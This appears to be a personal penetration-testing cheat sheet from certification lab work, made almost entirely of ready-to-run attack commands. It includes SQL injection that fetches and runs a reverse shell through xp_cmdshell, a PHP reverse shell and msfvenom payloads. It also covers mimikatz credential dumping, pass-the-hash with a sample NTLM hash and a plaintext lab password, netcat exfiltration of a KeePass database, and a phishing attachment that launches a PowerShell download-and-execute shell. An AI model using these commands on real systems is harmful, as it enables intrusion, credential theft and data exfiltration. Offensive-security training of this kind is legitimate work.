## Initial Enumeration

```
autorecon -v -t targets.txt
sudo env "PATH=$PATH" autorecon -v -t targets.txt (For UDP scan)
nmap -v -p 80 --script=http-title <IP>
nmap -sV -Sc <IP>
sudo nmap <IP> -p- -sV -vv --open --reason 
```

## Set up
```
python -m http.server 80
```
### Chisel (if needed)
```
cd /opt/chisel
./chisel server -p 1050 --reverse
. C:\Windows\temp\chisel-x64.exe client 192.168.45.213:1050 R:socks
```

## Web application
### SQL injection
```
', =, ", -- (Test for error)
'waitfor delay '0:0:10'-- (mssql test)
';exec xp_cmdshell 'certutil -urlcache -f http://192.168.45.213:444/reverse.exe C:\Windows\temp\reverse.exe';-- (mssql)
';exec master.dbo.xp_cmdshell 'cmd /c C:\Windows\temp\reverse.exe';-- (mssql to run command)
```
### Scenarios
1. Login page with SQL injection
2. Apache version (Use searchsploit)
3. Vulnerable host/web version
4. CMS version with default password
### PHP
[Reverse shell php](https://github.com/WhiteWinterWolf/wwwolf-php-webshell)
```
<?php
$sock = fsockopen("127.0.0.1",1234);
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
?>
```

## Password
### hydra
```
hydra -vV -l offsec -P /usr/share/wordlists/rockyou.txt ssh://<victim>:22
```
### john
```
ssh2john id_ecdsa > id_ecdsa.john
john --wordlist=/usr/share/wordlists/rockyou.txt id_ecdsa.john
keepass2john Database.kdbx
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.txt
```
### hashcat
```
hashcat --help | grep -i "Kerberos" (to check correct mode)
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Windows
### Enumeration
```
certutil -urlcache -f http://<attacker IP>:80/winpeas.bat C:\Windows\temp\winpeas.bat
. winPEAS.bat
whoami /all
systeminfo | findstr /B /C:"Host Name" /C:"OS Name" /C:"OS Version" /C:"System Type" /C:"Hotfix(s)"
. mimikatz.exe -> Privilege::debug -> sekurlsa::logonpasswords (Must be admin)
icacls
schtasks /query /v /fo LIST | Select-Object -First 40
SET in cmd.exe to see environment
```
### SE Impersonate Privilege
[Printspoofer](https://github.com/itm4n/PrintSpoofer):
```
. C:\Windows\temp\PrintSpoofer64.exe -i -c cmd
```
JuicyPotatoNG:
```
certutil -urlcache -f http://IP:80/JuicyPotatoNG.exe C:\Windows\temp\JuicyPotatoNG.exe
certutil -urlcache -f http://IP:80/reverse.exe C:\Windows\temp\reverse.exe
Create a bat file with content: C:\Windows\temp\reverse.exe
certutil -urlcache -f http://IP:80/rev.bat C:\Windows\temp\rev.bat
C:\Windows\temp\JuicyPotatoNG.exe -t * -p C:\Windows\temp\rev.bat
```
### Credential hunt
1. Registry information
```
reg save hklm\sam sam
```
2. mimikatz
3. 

### PE scenarios
1. Potato attack
2. Evil-winrm (with creds)
3. Impacket-psexec (with creds)
4. Replace high privilege exes/dlls (hijack)
5. DLL search order
6. AS-REP Roasting
```
proxychains4 impacket-GetNPUsers -dc-ip <DC ip> -request -outputfile hashes.asreproast domain.com/user (uses user with password to check if any other users do not require kerberos pre auth enabled
use hashcat to crack kerberos hash
```
7. Abusing services and DLL hijack
```
Check winpeas and procmon
sc.exe create NewService binpath= c:\Users\user\Desktop\scheduler.exe
msfvenom sus dll and upload
```
8. Check automated scripts (such as ps1 scripts)
```
Adding revshell.exe command to run in script etc
```

## Linux
### Enumeration
```
wget http://<attacker IP>:80/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
history
sudo -l
./pspy64
```
### Credential hunt
1. /etc/passwd + /etc/shadow
2. history
3. .ssh (Extract private key)
```
ssh -i pkey user@IP
/home/anita/.ssh/id_ecdsa (Different algo)
ssh -i id_ecdsa user@ip -p 2222
```
4. Go to user /home/user and check .history
### PE scenarios
1. [Vulnerable sudo](https://github.com/mohinparamasivam/Sudo-1.8.31-Root-Exploit)
2. history commands
3. sudo -l NOPASSWD
4. Privileged commands for specific applications
```
Example:
sudo borg list /opt/borgbackup
sudo borg extract /opt/borgbackup::home --stdout
```
5. Potential webserver 
```
Example:
apache24 in /usr/local/www
SUID binary
check /usr/local/etc/doas.conf
doas service apache24 onestart
netstat -na -f inet | grep LISTEN (sus port)
Writable dir
Upload webshell (csh, sh etc)
doas.conf specific group can act as root without password
checking www's group
```

## FTP
### Anonymous log in
```
ftp 192.158.192.247 14020 username:anonymous, pw: test
```
## SMB
### Enumerate
```
smbclient -L IP/<sharename>
smbclient -L IP/<transfer> -c ‘recurse;ls’
```
## Tools/tricks
### crackmapexec
```
proxychains4 crackmapexec smb/rdp <ip> -u <user> -p <password> (User proxychains if needed. Pwn means admin)
```
### Impacket
```
proxychains4 impacket-psexec tech.com/user:'password'@IP
impacket-secretsdump -sam sam -system system -security security local
Proxychains4 impacket-psexec "Administrator":@172.16.189.10 -hashes aad3b435b51404eeaad3b435b51404ee:f26c0186c8ffcceb01fd2d7549e7ac1f
```
### evil-winrm
```
proxychains4 evil-winrm -i <IP> -u mario -H <hash>
```
### msfvenom
```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=IP LPORT=4444 -f exe > reverse.exe (Staged)
msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=443 -f dll -o rev.dll
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.155 LPORT=4445 -f exe -o shell.exe
```
### Keepass (KDBX)
```
Use the keepass2 application
```
### nc to download
```
certutil -urlcache -f http://192.168.45.155:444/nc.exe C:\Users\User\Documents\nc.exe
cmd /c 'nc.exe IP 4442 -w 3 < Database.kdbx'
nc -lvp > Database.kdbx
```
### Windows library files with email
```
/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=9001 --auth=anonymous --root /home/kali/Desktop/
Create a shortcut within windows: powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.155:444/powercat.ps1'); powercat -c 192.168.45.155 -p 4441 -e powershell"
Make sure to have powercat in the webdav
Create a config.Library-ms file in webdav
sudo swaks -t user@domain.com --from mail@domain.com --attach @config.Library-ms --server 192.168.217.189 --body @body.txt --header "Subject:staging script" --suppress-data -ap
```
### Git
```
git status
git show master
```
### Portforwarding
```
ssh -i id_ecdsa -L 9090:127.0.0.1:8000 victim@ip -p 2222 (Local port forward)
proxychains4 ssh -L 9090:127.0.0.1:9000 victim@ip
ssh -N -R 192.168.45.175:9001:127.0.0.1:9000 kali@192.168.45.175 (remote)
```
### xfreerdp
```
xfreerdp /u:maildmz /p:'SlimGodhoodMope' /v:172.16.111.7 /d:relia.com /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /drive:/home/kali/Desktop/OSCP/challenge/Relia
```
### fqdn only with /etc/hosts
```
<ip> <web.com>
```
### exiftool
```
exiftool -a -u .pdf
```
